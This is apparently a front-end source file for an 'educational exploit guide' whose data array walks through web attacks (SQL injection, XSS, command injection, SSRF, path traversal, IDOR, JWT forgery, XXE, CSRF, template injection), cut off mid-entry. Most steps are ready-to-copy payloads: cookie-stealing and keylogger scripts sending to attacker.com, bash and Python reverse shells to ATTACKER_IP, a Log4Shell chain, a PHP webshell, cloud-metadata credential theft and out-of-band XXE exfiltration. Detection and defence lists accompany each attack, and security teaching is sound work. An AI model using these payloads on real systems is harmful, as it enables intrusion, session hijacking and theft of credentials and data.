// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// HackAnon — Educational exploit guide for developers & security researchers
import { useState, useRef } from "react";
import {
  AlertTriangle, Shield, ChevronRight, Copy, Check, Search,
  Lock, Zap, Globe, Database, Code2, Key, FileText, Cpu,
  Bug, Radio, BookOpen, ArrowRight, Eye, Terminal,
} from "lucide-react";

const BASE = import.meta.env.BASE_URL?.replace(/\/$/, "") ?? "";

function CB({ children, label }: { children: string; label?: string }) {
  const [done, setDone] = useState(false);
  return (
    <div className="my-2">
      {label && <div className="text-[8px] text-orange-400/60 font-mono uppercase tracking-widest mb-1">{label}</div>}
      <pre className="relative group font-mono text-[10px] bg-black/80 border border-orange-500/20 rounded p-3 text-green-400/90 overflow-x-auto whitespace-pre-wrap leading-relaxed">
        {children}
        <button
          onClick={() => { navigator.clipboard.writeText(children); setDone(true); setTimeout(() => setDone(false), 1800); }}
          className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity text-primary/30 hover:text-primary"
        >
          {done ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
        </button>
      </pre>
    </div>
  );
}

function Step({ n, title, children }: { n: number; title: string; children: React.ReactNode }) {
  return (
    <div className="flex gap-3">
      <div className="w-6 h-6 rounded-full bg-orange-500/20 border border-orange-500/30 flex items-center justify-center shrink-0 mt-0.5">
        <span className="text-[9px] font-bold text-orange-400">{n}</span>
      </div>
      <div className="flex-1">
        <div className="text-[10px] font-mono font-bold text-primary mb-1">{title}</div>
        <div className="text-[10px] font-mono text-primary/75 leading-relaxed">{children}</div>
      </div>
    </div>
  );
}

function Defend({ items }: { items: string[] }) {
  return (
    <div className="border border-green-500/20 bg-green-900/10 rounded p-3 mt-3">
      <div className="text-[9px] font-mono font-bold text-green-400 uppercase tracking-widest mb-2 flex items-center gap-1.5">
        <Shield className="w-3 h-3" /> Defense / How to Protect
      </div>
      {items.map(i => <div key={i} className="text-[9px] font-mono text-green-400/80 flex gap-2"><span className="shrink-0">✓</span>{i}</div>)}
    </div>
  );
}

function Detect({ items }: { items: string[] }) {
  return (
    <div className="border border-yellow-500/20 bg-yellow-900/10 rounded p-3 mt-2">
      <div className="text-[9px] font-mono font-bold text-yellow-400 uppercase tracking-widest mb-2 flex items-center gap-1.5">
        <Eye className="w-3 h-3" /> How to Detect It
      </div>
      {items.map(i => <div key={i} className="text-[9px] font-mono text-yellow-400/80 flex gap-2"><span className="shrink-0">→</span>{i}</div>)}
    </div>
  );
}

interface Exploit {
  id: string;
  title: string;
  category: string;
  severity: "critical" | "high" | "medium";
  icon: React.ElementType;
  platformTool?: { label: string; route: string };
  summary: string;
  howItWorks: string;
  steps: Array<{ title: string; desc: string; cmd?: string }>;
  detect: string[];
  defend: string[];
}

const EXPLOITS: Exploit[] = [
  {
    id: "sqli",
    title: "SQL Injection (SQLi)",
    category: "Injection",
    severity: "critical",
    icon: Database,
    platformTool: { label: "SQLi Scanner", route: "/sqli-scanner" },
    summary: "An attacker inserts malicious SQL code into an input field, forcing the database to execute unintended commands — leaking data, bypassing auth, or deleting records.",
    howItWorks: "When user input is concatenated directly into SQL queries without sanitization, the attacker can close the original string and inject new SQL logic. Type: error-based (leaks DB errors), blind boolean (true/false responses), time-based blind (SLEEP delays), UNION-based (retrieves other tables).",
    steps: [
      { title: "Find the injection point", desc: "Add a single quote to any input field and look for DB errors, blank pages, or behavioral changes.", cmd: "https://target.com/product?id=1'" },
      { title: "Confirm vulnerability (boolean)", desc: "Test true vs false payloads — if the page changes, it's injectable.", cmd: "id=1 AND 1=1--   (should return normal)\nid=1 AND 1=2--   (should return empty/different)" },
      { title: "Enumerate columns via ORDER BY", desc: "Increment the ORDER BY value until you get an error to count columns.", cmd: "id=1 ORDER BY 1--\nid=1 ORDER BY 2--\nid=1 ORDER BY 3--   <-- if this errors, there are 2 columns" },
      { title: "Extract data with UNION SELECT", desc: "Retrieve data from other tables by appending a UNION SELECT.", cmd: "id=0 UNION SELECT NULL,table_name FROM information_schema.tables--\nid=0 UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--\nid=0 UNION SELECT username,password FROM users--" },
      { title: "Automate with sqlmap", desc: "Use sqlmap to dump the entire database automatically.", cmd: "# Install\npip install sqlmap\n\n# Basic dump\nsqlmap -u 'https://target.com/product?id=1' --dbs\nsqlmap -u 'https://target.com/product?id=1' -D mydb --tables\nsqlmap -u 'https://target.com/product?id=1' -D mydb -T users --dump\n\n# POST body injection\nsqlmap -u 'https://target.com/login' --data='user=test&pass=test' -p user\n\n# Cookie injection\nsqlmap -u 'https://target.com/dashboard' --cookie='session=abc123' --level=3" },
      { title: "Auth bypass (login panels)", desc: "Bypass login without knowing the password by injecting into the username field.", cmd: "Username: admin'--\nPassword: anything\n\n# Or universal bypass\nUsername: ' OR '1'='1'--\nPassword: ' OR '1'='1'--" },
    ],
    detect: [
      "Enable DB error logging and monitor for SQL syntax errors in logs",
      "Web Application Firewall (WAF) alert on SQL keywords in parameters",
      "IDS rules matching UNION SELECT, ORDER BY N--, information_schema patterns",
      "Abnormal query times (time-based blind uses SLEEP/WAITFOR DELAY)",
    ],
    defend: [
      "Use parameterized queries / prepared statements — NEVER concatenate user input into SQL",
      "Use an ORM (Drizzle, Prisma, Sequelize) with built-in escaping",
      "Least-privilege DB accounts: app user should not have DROP/ALTER rights",
      "Input validation: reject inputs containing SQL keywords if not expected",
      "Deploy a WAF with SQLi rule sets (ModSecurity OWASP CRS)",
    ],
  },
  {
    id: "xss",
    title: "Cross-Site Scripting (XSS)",
    category: "Injection",
    severity: "high",
    icon: Code2,
    platformTool: { label: "Intruder", route: "/intruder" },
    summary: "An attacker injects malicious JavaScript into a web page that runs in other users' browsers — stealing session cookies, redirecting users, or capturing keystrokes.",
    howItWorks: "Reflected XSS: payload in URL reflected back. Stored XSS: payload saved to DB and served to all viewers. DOM XSS: payload manipulates client-side JS without server involvement. All three can steal session cookies, inject keyloggers, or redirect to phishing pages.",
    steps: [
      { title: "Find a reflection point", desc: "Submit text in every input and check if it appears in the HTML response unescaped.", cmd: `https://target.com/search?q=teststring\n# View page source — look for 'teststring' in HTML` },
      { title: "Test basic XSS payload", desc: "If the string reflects unescaped, try a script tag.", cmd: `<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n"><svg onload=alert(1)>` },
      { title: "Steal cookies (session hijacking)", desc: "Replace alert with a cookie exfiltrator pointing to your listener.", cmd: `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n\n# Or fetch-based (silent)\n<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>\n\n# Start a listener\nnc -lvnp 8080\n# Or use RequestBin / your OAST server` },
      { title: "Stored XSS (max impact)", desc: "Submit payload to a comment/profile/message field. Every user who views it executes your JS.", cmd: `# In a comment box or forum post:\n<script>var i=new Image();i.src='https://attacker.com/log?c='+document.cookie;</script>\n\n# Keylogger injection\n<script>document.onkeypress=function(e){fetch('https://attacker.com/keys?k='+e.key)}</script>` },
      { title: "DOM XSS (client-side sinks)", desc: "Find JS that reads URL params and writes to innerHTML/eval.", cmd: `# Look for dangerous sinks in JS:\ngrep -r 'innerHTML\\|document.write\\|eval(' *.js\n\n# If URL is:\nhttps://target.com/#<img src=x onerror=alert(1)>\n# And JS does: document.getElementById('x').innerHTML = location.hash` },
    ],
    detect: [
      "CSP (Content-Security-Policy) violation reports — enable report-uri",
      "WAF alerts on <script>, onerror=, javascript: URI patterns",
      "Monitor outbound connections from your domain to unexpected external hosts",
      "Use XSS auditing in browser dev tools / Burp Suite passive scanner",
    ],
    defend: [
      "HTML-encode all user output: & → &amp;, < → &lt;, > → &gt;, \" → &quot;",
      "Set Content-Security-Policy header: script-src 'self' blocks inline scripts",
      "Use React/Angular/Vue — their template engines auto-escape by default",
      "Set HttpOnly + Secure + SameSite=Strict on session cookies",
      "Never use innerHTML/eval with user input — use textContent instead",
    ],
  },
  {
    id: "rce",
    title: "Remote Code Execution (RCE)",
    category: "Injection",
    severity: "critical",
    icon: Terminal,
    summary: "The attacker runs arbitrary OS commands on the server — the most severe exploit class, often leading to full server compromise, backdoor installation, and lateral movement.",
    howItWorks: "RCE via command injection (user input passed to shell), file upload (upload PHP/ASPX webshell), deserialization, Log4Shell (JNDI lookup), or vulnerable library (e.g., Spring4Shell). Attacker typically gets a reverse shell callback for interactive access.",
    steps: [
      { title: "Test command injection in parameters", desc: "Add shell metacharacters to inputs handled by exec/system calls.", cmd: `# Test payloads (Linux)\n; id\n| id\n&& id\n\`id\`\n$(id)\n\n# Windows\n; whoami\n| dir\n& ipconfig\n\n# If the output of 'id' or 'whoami' appears in the response, you have RCE` },
      { title: "Get a reverse shell", desc: "Replace 'id' with a reverse shell payload. Start your listener first.", cmd: `# 1. Start netcat listener on YOUR machine\nnc -lvnp 4444\n\n# 2. Inject one of these as the command:\n# Bash reverse shell\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Python reverse shell\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\n\n# URL-encoded for HTTP params\n%62%61%73%68%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261` },
      { title: "Log4Shell (CVE-2021-44228)", desc: "Any input field processed by Log4j — user-agent, username, X-Forwarded-For — triggers JNDI lookup.", cmd: `# Payload in any HTTP header or input:\n\${jndi:ldap://attacker.com:1389/exploit}\n\n# Test with OAST DNS callback (use your OAST server):\n\${jndi:ldap://YOUR_OAST_DOMAIN/test}\n\n# Full exploit chain requires:\n# 1. LDAP server (marshalsec)\n# 2. HTTP server serving malicious Java class\njava -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Exploit"\npython3 -m http.server 8888` },
      { title: "Webshell via file upload", desc: "Upload a PHP/ASPX file if the server runs those languages and the upload doesn't validate extension.", cmd: `# PHP webshell (save as shell.php)\n<?php system($_GET['cmd']); ?>\n\n# Upload it, then access:\nhttps://target.com/uploads/shell.php?cmd=id\nhttps://target.com/uploads/shell.php?cmd=cat+/etc/passwd\n\n# If extension blocked, try:\nshell.php.jpg\nshell.pHp\nshell.php%00.jpg\nshell.phtml` },
    ],
    detect: [
      "Outbound connections from web server process to unexpected IPs (reverse shell)",
      "New processes spawned by httpd/nginx/node — monitor with auditd or EDR",
      "JNDI/LDAP lookups in DNS logs for Log4Shell",
      "New files in upload directories not matching expected formats",
    ],
    defend: [
      "Never pass user input to exec()/system()/shell_exec() — use parameterized APIs instead",
      "Validate file uploads: check magic bytes (not just extension), restrict MIME type, store outside webroot",
      "Update Log4j to 2.17.1+ or set log4j2.formatMsgNoLookups=true",
      "Run web server as unprivileged user — limits blast radius of shell access",
      "Egress filtering: block outbound connections from web server processes",
    ],
  },
  {
    id: "ssrf",
    title: "Server-Side Request Forgery (SSRF)",
    category: "Server-Side",
    severity: "critical",
    icon: Globe,
    platformTool: { label: "OSINT Recon", route: "/osint" },
    summary: "The attacker forces the server to make HTTP requests to internal systems — accessing AWS metadata, internal APIs, or services behind the firewall that the attacker cannot reach directly.",
    howItWorks: "Any parameter that fetches a URL (webhook URL, image URL, PDF generator, import from URL) is a potential SSRF vector. The server makes the request from its own network context, bypassing firewall rules that block the attacker directly.",
    steps: [
      { title: "Find URL-fetching parameters", desc: "Look for params named url=, webhook=, imageUrl=, target=, redirect=, fetch=, load=.", cmd: `https://target.com/api/fetch?url=https://external.com\nhttps://target.com/preview?doc=https://storage.example.com/file.pdf\nhttps://target.com/webhook?callback=https://your-server.com` },
      { title: "Test basic SSRF to internal hosts", desc: "Point the URL at internal addresses and observe responses.", cmd: `# Localhost\nhttps://target.com/fetch?url=http://127.0.0.1\nhttps://target.com/fetch?url=http://localhost:8080\nhttps://target.com/fetch?url=http://0.0.0.0\n\n# Common internal services\nhttps://target.com/fetch?url=http://10.0.0.1\nhttps://target.com/fetch?url=http://192.168.1.1\nhttps://target.com/fetch?url=http://172.16.0.1` },
      { title: "AWS metadata SSRF (critical)", desc: "Cloud instances expose credentials at a fixed IP. This leads to full AWS account takeover.", cmd: `# AWS IMDSv1 (no token required)\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n\n# GCP metadata\nhttps://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n# Add header: Metadata-Flavor: Google\n\n# Azure metadata\nhttps://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` },
      { title: "Bypass SSRF filters", desc: "Many filters blocklist '127.0.0.1' but forget equivalent forms.", cmd: `# Decimal IP\nhttp://2130706433  (= 127.0.0.1)\nhttp://0177.0.0.1  (= 127.0.0.1 in octal)\n\n# IPv6\nhttp://[::1]/\nhttp://[::ffff:127.0.0.1]/\n\n# URL encoding\nhttp://127.0.0.1%2F\n\n# DNS rebinding: register a domain that resolves to 127.0.0.1\nhttp://localtest.me/  (public DNS -> 127.0.0.1)\n\n# Redirect chain: your server 302-redirects to internal\ncurl 'https://target.com/fetch?url=https://attacker.com/redirect'\n# attacker.com returns: HTTP/302 Location: http://169.254.169.254/` },
    ],
    detect: [
      "Log all outbound HTTP requests from your application servers",
      "Alert on requests to RFC-1918 ranges (10.x, 172.16-31.x, 192.168.x) from app tier",
      "Alert on requests to 169.254.169.254 (metadata IP) — always block this",
      "OAST/DNS callback: use ProxhqVPN OAST server to detect blind SSRF",
    ],
    defend: [
      "Allowlist approach: only permit requests to known, approved domains",
      "Block all RFC-1918 ranges and 169.254.0.0/16 at the network layer for app servers",
      "Enforce IMDSv2 on AWS (requires session token — prevents SSRF metadata theft)",
      "Validate and sanitize URL schemes: block file://, gopher://, dict://",
      "Use a dedicated egress proxy with logging for all app outbound traffic",
    ],
  },
  {
    id: "lfi",
    title: "Local File Inclusion / Path Traversal",
    category: "Server-Side",
    severity: "high",
    icon: FileText,
    platformTool: { label: "Directory Fuzzer", route: "/dir-fuzzer" },
    summary: "The attacker manipulates file path parameters to read arbitrary files on the server — /etc/passwd, SSH keys, app source code, environment files with API keys.",
    howItWorks: "When a web app loads files based on user input (include, require, readFile), an attacker injects ../ sequences to escape the intended directory. LFI can escalate to RCE via log poisoning (inject PHP code into server logs, then LFI the log file).",
    steps: [
      { title: "Identify file inclusion parameters", desc: "Look for params named file=, page=, include=, doc=, template=, path=, view=.", cmd: `https://target.com/page?file=about\nhttps://target.com/load?template=home\nhttps://target.com/view?doc=manual` },
      { title: "Basic path traversal", desc: "Inject ../ sequences to escape the web root.", cmd: `# Linux targets\nhttps://target.com/page?file=../../../etc/passwd\nhttps://target.com/page?file=../../../../etc/shadow\nhttps://target.com/page?file=../../../home/user/.ssh/id_rsa\nhttps://target.com/page?file=../../../../var/www/html/.env\n\n# Windows targets\nhttps://target.com/page?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts\nhttps://target.com/page?file=..\\..\\..\\Windows\\win.ini` },
      { title: "Bypass basic filters", desc: "Some apps strip '../' — use double-encode or null byte tricks.", cmd: `# Double URL encoding (../ = %2e%2e%2f)\nhttps://target.com/page?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd\n\n# Null byte bypass (PHP < 5.3.4)\nhttps://target.com/page?file=../../../etc/passwd%00.php\n\n# Path truncation\nhttps://target.com/page?file=....//....//etc/passwd\n\n# With forced extension\nhttps://target.com/page?file=/etc/passwd%00` },
      { title: "Log poisoning → RCE", desc: "Inject PHP code into the Apache/Nginx access log, then LFI the log file to execute it.", cmd: `# Step 1: Poison the log by sending a request with PHP as User-Agent\ncurl -A '<?php system($_GET["cmd"]); ?>' https://target.com/\n\n# Step 2: Include the log file\nhttps://target.com/page?file=../../../var/log/apache2/access.log&cmd=id\n\n# Common log paths:\n/var/log/apache2/access.log\n/var/log/nginx/access.log\n/var/log/auth.log    (SSH logs)\n/proc/self/environ   (environment vars — sometimes writable)` },
    ],
    detect: [
      "Alert on parameters containing ../ or %2e%2e patterns",
      "Monitor file access logs for reads of /etc/passwd, /etc/shadow, .env, .ssh/ paths",
      "WAF rules matching path traversal sequences",
      "IDS alert on HTTP responses containing 'root:x:0:0' (passwd file content)",
    ],
    defend: [
      "Never use user input directly in filesystem paths — use a whitelist of allowed file identifiers",
      "Resolve the canonical path (realpath) and verify it's within the expected directory",
      "Run the web server as an unprivileged user with minimal filesystem read access",
      "Use chroot jails or containers to limit filesystem scope",
      "Disable PHP allow_url_include and allow_url_fopen in php.ini",
    ],
  },
  {
    id: "idor",
    title: "IDOR — Insecure Direct Object Reference",
    category: "Broken Access Control",
    severity: "high",
    icon: Lock,
    platformTool: { label: "Intruder", route: "/intruder" },
    summary: "The application uses predictable identifiers (IDs, filenames, order numbers) in requests without verifying the requesting user owns that object — allowing any user to access or modify another user's data.",
    howItWorks: "The attacker enumerates IDs in API calls. Since there's no authorization check ('does user A own order 1002?'), they can read, modify, or delete data belonging to any other user.",
    steps: [
      { title: "Identify object references in requests", desc: "Intercept API calls in Burp Suite. Look for numeric IDs, UUIDs, usernames in URLs or JSON bodies.", cmd: `GET /api/invoices/1042\nGET /api/users/555/profile\nGET /api/orders?user_id=1042\nGET /api/messages/thread/9821` },
      { title: "Enumerate adjacent IDs", desc: "Change the ID to adjacent values and observe if you get other users' data.", cmd: `# Automated enumeration with ffuf\nffuf -u 'https://target.com/api/invoices/FUZZ' \\\n  -w numbers.txt \\\n  -H 'Authorization: Bearer YOUR_TOKEN' \\\n  -mc 200\n\n# Simple curl loop\nfor i in $(seq 1000 1100); do\n  curl -s -H 'Authorization: Bearer TOKEN' \\\n    https://target.com/api/orders/$i | jq '.user_id'\ndone\n\n# Generate wordlist\nseq 1000 9999 > numbers.txt` },
      { title: "IDOR on file downloads", desc: "Change document IDs or filenames in download endpoints.", cmd: `# If your download link is:\nhttps://target.com/files/download?id=a1b2c3\n\n# Try:\nhttps://target.com/files/download?id=a1b2c4\nhttps://target.com/files/download?id=a1b2c2\n\n# Or path-based:\nhttps://target.com/reports/user_1042.pdf  → user_1041.pdf` },
      { title: "Mass account takeover via IDOR", desc: "If the password reset or email-update endpoint accepts a user_id without validation:", cmd: `# Capture your own password reset request:\nPOST /api/account/email\n{"user_id": 555, "new_email": "attacker@evil.com"}\n\n# Change user_id to another user's ID:\n{"user_id": 554, "new_email": "attacker@evil.com"}\n\n# Now request a password reset for attacker@evil.com — full takeover` },
    ],
    detect: [
      "Log all object-access requests with (user_id, resource_id) pairs",
      "Alert when user A accesses objects in quantity that don't belong to them",
      "Rate limit enumeration: alert on sequential ID access patterns",
      "Monitor for mass download events from a single account",
    ],
    defend: [
      "Always verify ownership server-side: 'SELECT * FROM orders WHERE id=? AND user_id=?'",
      "Use UUIDs or non-sequential IDs — harder to enumerate (but not a fix on its own)",
      "Implement row-level security in PostgreSQL / RLS policies",
      "Return 404 (not 403) for unauthorized resources to prevent confirming existence",
      "Use access control middleware that checks resource ownership automatically",
    ],
  },
  {
    id: "jwt",
    title: "JWT Attacks",
    category: "Authentication",
    severity: "critical",
    icon: Key,
    platformTool: { label: "JWT Analyzer", route: "/jwt-analyzer" },
    summary: "JSON Web Tokens can be forged or manipulated when servers don't validate the signature algorithm, accept weak secrets, or trust embedded keys — allowing attackers to impersonate any user including admins.",
    howItWorks: "JWT = header.payload.signature, all base64-encoded. Common attacks: alg:none (strip signature), HS256/RS256 confusion (use public key as HMAC secret), brute-force weak secret, kid injection (point to attacker-controlled key), jku/x5u header injection (load attacker's JWKS).",
    steps: [
      { title: "Decode and inspect the JWT", desc: "Always start by decoding the token to understand the algorithm and claims.", cmd: `# Decode (paste your JWT):\necho 'eyJhbGc...' | cut -d. -f1 | base64 -d 2>/dev/null | jq\necho 'eyJhbGc...' | cut -d. -f2 | base64 -d 2>/dev/null | jq\n\n# Or use jwt.io — paste token to decode online` },
      { title: "alg:none attack", desc: "Change the algorithm to 'none' and strip the signature. Some libraries skip verification.", cmd: `# Original header (base64):\n{"alg":"HS256","typ":"JWT"}\n\n# Modified header:\n{"alg":"none","typ":"JWT"}\n\n# New token: header_b64.payload_b64.   (empty signature)\n# Python:\nimport base64, json\nheader = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')\npayload = base64.b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).decode().rstrip('=')\nprint(f"{header}.{payload}.")` },
      { title: "Brute-force weak HMAC secret", desc: "If using HS256 with a weak secret, crack it offline.", cmd: `# Install hashcat or jwt-cracker\nnpm install -g jwt-cracker\njwt-cracker -t 'eyJhbGc...' -a 'abcdefghijklmnopqrstuvwxyz' -l 6\n\n# Or with hashcat (mode 16500 = JWT)\nhashcat -a 0 -m 16500 'eyJhbGc...' /usr/share/wordlists/rockyou.txt\n\n# Once cracked, forge any payload:\nimport jwt\nforged = jwt.encode({"sub":"admin","role":"admin"}, "SECRET", algorithm="HS256")` },
      { title: "RS256 → HS256 confusion", desc: "If the server uses RS256 and you have the public key, sign a token with it using HS256 — some libraries use the same key for both.", cmd: `# Get the public key from /jwks.json or /.well-known/openid-configuration\ncurl https://target.com/.well-known/jwks.json\n\n# Convert JWK to PEM\n# Use jwt_tool:\npython3 jwt_tool.py TOKEN -X k -pk public.pem\n\n# Or manual:\npython3 -c "\nimport jwt, json\nwith open('public.pem','rb') as f: pubkey = f.read()\nforged = jwt.encode({'sub':'admin'}, pubkey, algorithm='HS256')\nprint(forged)\n"` },
      { title: "kid SQL / path injection", desc: "If 'kid' is used to load a key from a file or DB without sanitization:", cmd: `# kid path traversal — point to a predictable empty/null file\n{"alg":"HS256","kid":"../../dev/null"}\n# Sign token with empty string as secret\n\n# kid SQL injection\n{"alg":"HS256","kid":"x' UNION SELECT 'attacker_secret'--"}\n# Sign token with 'attacker_secret'\n\n# Use jwt_tool to automate:\npython3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""` },
    ],
    detect: [
      "Log all JWT validation failures — alg:none attempts cause decoding errors",
      "Alert on JWTs with unexpected algorithm values in production",
      "Monitor for tokens with admin/elevated role claims from non-admin users",
      "Rate limit token validation to prevent brute-force cracking attempts",
    ],
    defend: [
      "Explicitly specify allowed algorithms server-side — never accept 'none'",
      "Use strong random secrets (256+ bits) for HMAC, store in environment variables",
      "Validate the 'alg' field strictly matches your configured algorithm",
      "Use library verify() with explicit algorithm parameter: jwt.verify(token, secret, { algorithms: ['HS256'] })",
      "Prefer RS256/ES256 over HS256 for multi-service architectures",
      "Short token expiry (15 min) + refresh token rotation",
    ],
  },
  {
    id: "xxe",
    title: "XML External Entity (XXE)",
    category: "Injection",
    severity: "critical",
    icon: FileText,
    summary: "When an app parses XML input with external entity processing enabled, an attacker can read local files, probe internal network services, or trigger SSRF by defining a malicious DTD in their XML payload.",
    howItWorks: "XML allows DOCTYPE declarations with ENTITY definitions. An external entity (SYSTEM) causes the XML parser to fetch a resource — a local file path or URL. The file contents are embedded in the parsed response, leaking sensitive data.",
    steps: [
      { title: "Find XML input points", desc: "Any endpoint that parses XML: SOAP APIs, file uploads (.docx, .xlsx, .svg, .xml), REST APIs with Content-Type: application/xml.", cmd: `# Test by submitting XML with a content-type header:\ncurl -X POST https://target.com/api/parse \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version="1.0"?><root><item>test</item></root>'` },
      { title: "Basic XXE file read", desc: "Define an entity that reads a local file and reference it in the XML body.", cmd: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root><item>&xxe;</item></root>\n\n# Other useful files:\nfile:///etc/shadow\nfile:///etc/hostname\nfile:///home/user/.ssh/id_rsa\nfile:///var/www/html/.env\nfile:///proc/self/environ` },
      { title: "SSRF via XXE", desc: "Use the SYSTEM keyword with an http:// URL to perform SSRF.", cmd: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n]>\n<data><item>&xxe;</item></data>` },
      { title: "Blind XXE with out-of-band (OOB)", desc: "When there's no response reflection, use DNS/HTTP callbacks.", cmd: `# Your DTD file (host at attacker.com/evil.dtd):\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">\n%oob;\n%exfil;\n\n# The XXE payload:\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">\n  %remote;\n]>\n<root/>\n\n# Use your ProxhqVPN OAST server to capture the callback` },
    ],
    detect: [
      "Log XML parsing errors — external entity errors produce distinctive messages",
      "Network monitoring: web server processes making outbound HTTP/file requests during XML processing",
      "WAF rules matching DOCTYPE, ENTITY SYSTEM, ENTITY % patterns",
      "OAST DNS callbacks if the server resolves your OOB hostname",
    ],
    defend: [
      "Disable external entity processing in your XML library:\n  Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n  Python: defusedxml library instead of xml.etree\n  PHP: libxml_disable_entity_loader(true)",
      "Use JSON instead of XML wherever possible",
      "Validate and sanitize XML input against a strict schema (XSD)",
      "Run XML parsers with minimum OS privileges",
    ],
  },
  {
    id: "csrf",
    title: "Cross-Site Request Forgery (CSRF)",
    category: "Authentication",
    severity: "high",
    icon: Radio,
    summary: "The attacker tricks a logged-in victim into making an unwanted request to a trusted site — changing their email, password, or making transactions on their behalf, because the browser automatically sends session cookies.",
    howItWorks: "Browsers automatically include cookies on every request. A malicious page hosted by the attacker contains a hidden form or auto-submitting request that triggers an action on the target site using the victim's active session.",
    steps: [
      { title: "Identify state-changing requests", desc: "Find POST/PUT/DELETE requests that change data (password, email, profile, money transfer) and are authenticated only by cookies.", cmd: `# Intercept in Burp Suite — filter for non-GET requests\n# Check if there's a CSRF token in the body or headers\n# If no CSRF token and auth is only via cookie — it's likely vulnerable` },
      { title: "Craft a CSRF attack page", desc: "Create an HTML page with a form that auto-submits to the target.", cmd: `<!-- Basic CSRF (HTML form) -->\n<html>\n<body onload="document.forms[0].submit()">\n  <form method="POST" action="https://target.com/api/account/email">\n    <input type="hidden" name="new_email" value="attacker@evil.com">\n  </form>\n</body>\n</html>\n\n<!-- JSON CSRF (if Content-Type is not strictly enforced) -->\n<html>\n<body>\n<script>\nfetch('https://target.com/api/account/email', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'new_email=attacker@evil.com'\n});\n</script>\n</body>\n</html>` },
      { title: "SameSite cookie bypass", desc: "If cookies are SameSite=Lax (default in Chrome), top-level navigation POST is still allowed from cross-origin.", cmd: `<!-- SameSite=Lax bypass via GET state-change -->\n<!-- If the endpoint also accepts GET: -->\n<img src="https://target.com/api/transfer?amount=1000&to=attacker">\n\n<!-- Or top-level redirect -->\n<script>window.location = 'https://target.com/api/logout';</script>` },
    ],
    detect: [
      "Monitor for requests missing your CSRF token from authenticated sessions",
      "Check Referer/Origin header — CSRF requests originate from attacker's domain",
      "Alert on rapid state-changing requests without user interaction pattern",
    ],
    defend: [
      "Use CSRF tokens: generate a unique random token per session, validate on every state-changing request",
      "Set SameSite=Strict on session cookies (blocks all cross-site cookie sending)",
      "Validate Origin/Referer headers on state-changing endpoints",
      "Use the Double Submit Cookie pattern for stateless CSRF protection",
      "Require re-authentication for critical actions (email/password change, payment)",
    ],
  },
  {
    id: "ssti",
    title: "Server-Side Template Injection (SSTI)",
    category: "Injection",
    severity: "critical",
    icon: Code2,
    summary: "When user input is embedded directly into a template engine expression (Jinja2, Twig, FreeMarker, Handlebars) without sanitization, the attacker can execute the template language's built-in functions to achieve RCE.",
    howItWorks: "Template engines use syntax like {{ expr }} or <%= expr %>. If user input like {{7*7}} is reflected as '49' in the response, the template engine is evaluating it. Attackers chain built-in methods to access the OS execution layer.",
    steps: [
      { title: "Detect template evaluation", desc: "Submit mathematical expressions in each input and check if the result (not the expression) appears in the response.", cmd: `# Universal detection payloads:\n{{7*7}}        → if 49 appears: Jinja2, Twig, or similar\n${7*7}         → if 49 appears: Freemarker, JavaScript templates\n<%= 7*7 %>     → if 49 appears: ERB (Ruby), EJS\n#{7*7}         → if 49 appears: Ruby\n{{7*'7'}}      → Jinja2 returns 49, Twig returns 7777777` },
      { title: "Fingerprint the engine", desc: "Use engine-specific syntax to identify which template engine is running.", cmd: "# Jinja2 (Python)\n{{config.items()}}     → shows Flask config\n{{self.__class__}}\n\n# Twig (PHP)\n{{app.request.server.all|join(',')}}\n\n# FreeMarker (Java)\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n\n# Handlebars (Node.js)\n{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}{{this.push (lookup string.sub \"constructor\")}}..." },
      { title: "Jinja2 RCE (Python Flask)", desc: "Chain through Python's class hierarchy to reach the OS module.", cmd: `# Get RCE via subprocess:\n{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}\n\n# Simpler with config (Flask-specific):\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Reverse shell:\n{{''.__class__.__mro__[1].__subclasses__()[396](\n  'bash -i >& /dev/tcp/ATTACKER/4444 0>&1',\n  shell=True\n)}}` },
